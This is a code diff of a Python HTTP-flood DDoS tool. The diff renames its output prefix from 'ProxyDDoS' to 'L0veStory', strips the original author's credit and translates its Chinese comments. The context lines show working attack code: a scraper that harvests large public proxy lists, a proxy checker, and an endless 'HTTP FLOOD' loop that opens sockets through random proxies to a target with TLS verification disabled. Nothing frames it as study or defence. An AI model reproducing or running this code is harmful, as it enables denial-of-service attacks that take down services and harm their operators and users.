@@ -1,3 +1,4 @@
+import os
 import ssl
 import sys
 import time
@@ -8,7 +9,9 @@ import requests
 import threading
 from queue import Queue
 
-# ------------------ Pengaturan ------------------
+os.system("clear")
+
+# -----------------------------------
 
 rand = ["a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
 string = ['Hurricane','Proknight','Sockskull','Taixies','Collapser','Deprave','JeiKai','Noro','Ebola']
@@ -133,7 +136,7 @@ def check_proxy(proxy): # Detecting proxy TCP connections and HTTP requests
         with lock:
             conns += 1
             good_proxies.append(proxy)
-            print(f"[ProxyDDoS]->proxy: \033[35m{proxy_ip:^15s}\033[0m port: \033[33;1m{str(proxy_port):^5s}\033[0m conns: \033[34m{str(conns):^4s}\033[0m >{proto:^5s} \033[32;1mConnected\033[0m")
+            print(f"[L0veStory]->proxy: \033[35m{proxy_ip:^15s}\033[0m port: \033[33;1m{str(proxy_port):^5s}\033[0m conns: \033[34m{str(conns):^4s}\033[0m >{proto:^5s} \033[32;1mConnected\033[0m")
             print(f'\33]0;[{conns}] Proxies | ProxyChecker Code By GogoZin\a',end='')
     except Exception as e:
         pass
@@ -242,9 +245,9 @@ def headerHandle(): #Packet Header Processing
     return header #Return the processed header
 
 
-def ProxyScraper(): # 抓取proxy的 , # Regarding proxy scraping—having done this countless times, I can say with certainty that out of a list of 50,000 to 70,000 proxies with latencies under one second, no more than 400 are actually usable.
+def ProxyScraper(): # Proxy scraping , # Regarding proxy scraping—having done this countless times, I can say with certainty that out of a list of 50,000 to 70,000 proxies with latencies under one second, no more than 400 are actually usable.
     global download_proxy
-    print("Auto Proxy Scraper Code By GogoZin")
+    print("Auto Proxy Scraper")
     time.sleep(2)
     s5URL = [
              "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=all",
@@ -256,7 +259,7 @@ def ProxyScraper(): # 抓取proxy的 , # Regarding proxy scraping—having done 
     for u in s5URL:
         r = requests.get(u)
         if r.status_code == 200:
-            print(f"[ProxyDDoS]->status: \033[32;1m{r.status_code}\033[0m \033[36m{u}\033[0m")
+            print(f"[L0veStort]->status: \033[32;1m{r.status_code}\033[0m \033[36m{u}\033[0m")
             lst = r.text.split("\r\n")
             for lines in lst:
                 if len(lines) > 10 and len(lines) < 22:
@@ -279,7 +282,7 @@ def ProxyScraper(): # 抓取proxy的 , # Regarding proxy scraping—having done 
                     proxy = ip+":"+port
                 download_proxy.append(proxy)
             
-        print(f"[ProxyDDoS]->status: \033[32;1m{r.status_code}\033[0m \033[36m{u}\033[0m")
+        print(f"[L0veStory]->status: \033[32;1m{r.status_code}\033[0m \033[36m{u}\033[0m")
 
     print("Start Fetch From FreeProxyUpdate")
     fpu = ["https://freeproxyupdate.com/files/txt/http.txt",
@@ -313,7 +316,7 @@ def ProxyScraper(): # 抓取proxy的 , # Regarding proxy scraping—having done 
     for u in fpu:
         r = requests.get(u)
         if r.status_code == 200:
-            print(f"[ProxyDDoS]->status: \033[32;1m{r.status_code}\033[0m \033[36m{u}\033[0m")
+            print(f"[L0veStory]->status: \033[32;1m{r.status_code}\033[0m \033[36m{u}\033[0m")
             lst = r.text.split('\n')
             for lines in lst:
                 if len(lines) > 10 and len(lines) < 22:
@@ -339,7 +342,7 @@ def ProxyScraper(): # 抓取proxy的 , # Regarding proxy scraping—having done 
     print("fetch proxies from Proxifly")
     r = requests.get(proxifly)
     if r.status_code == 200:
-        print(f"[ProxyDDoS]->status: \033[32;1m{r.status_code}\033[0m \033[36mProxifly\033[0m")
+        print(f"[L0veStory]->status: \033[32;1m{r.status_code}\033[0m \033[36mProxifly\033[0m")
         lst = r.text.split('\n')
         for lines in lst:
             if len(lines) > 10 and len(lines) < 22:
@@ -348,7 +351,7 @@ def ProxyScraper(): # 抓取proxy的 , # Regarding proxy scraping—having done 
     ip89cn = "https://api.89ip.cn/tqdl.html?api=1&num=9999&port=&address=&isp="
     r = requests.get(ip89cn)
     if r.status_code == 200:
-        print(f"[ProxyDDoS]->status: \033[32;1m{r.status_code}\033[0m \033[36m89ip.cn\033[0m")
+        print(f"[L0veStory]->status: \033[32;1m{r.status_code}\033[0m \033[36m89ip.cn\033[0m")
         lst = r.text.split('\n')
         for lines in lst:
             if len(lines) > 10 and len(lines) < 22:
@@ -359,7 +362,7 @@ def ProxyScraper(): # 抓取proxy的 , # Regarding proxy scraping—having done 
         host = u.split(".com/")[1]
         r = requests.get(u)
         if r.status_code == 200:
-            print(f"[ProxyDDoS]->status: \033[32;1m{r.status_code}\033[0m \033[36m{host}\033[0m")
+            print(f"[L0veStory]->status: \033[32;1m{r.status_code}\033[0m \033[36m{host}\033[0m")
             lst = r.text.split("\n")
             for lines in lst:
                 if len(lines) > 10 and len(lines) < 22:
@@ -385,7 +388,7 @@ def launchThreads():
             pass
 
 
-def send_requests(): #傳統HTTP FLOOD
+def send_requests(): #TraditionHTTP FLOOD
     try:
         proxy_ip, proxy_port = random.choice(good_proxies).split(":")
         proxy_port = int(proxy_port)
@@ -399,12 +402,12 @@ def send_requests(): #傳統HTTP FLOOD
     while 1:
         try:
             s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # 重複啟用端口 (非共用)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4096 * 4096) # 加大傳送緩衝區 若設備帶寬不高請使用1024 * 1024
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Re-enable port (non-shared)
+            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4096 * 4096) # Increase the transmission buffer; use this if the device bandwidth is low.1024 * 1024
             s.set_proxy(socks.HTTP, proxy_ip, proxy_port)
             s.connect((host, port))
             if port == 443:
-                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT) # 使用標準TLS
+                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT) # Use standard TLS
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
                 s = context.wrap_socket(s, server_hostname=host)
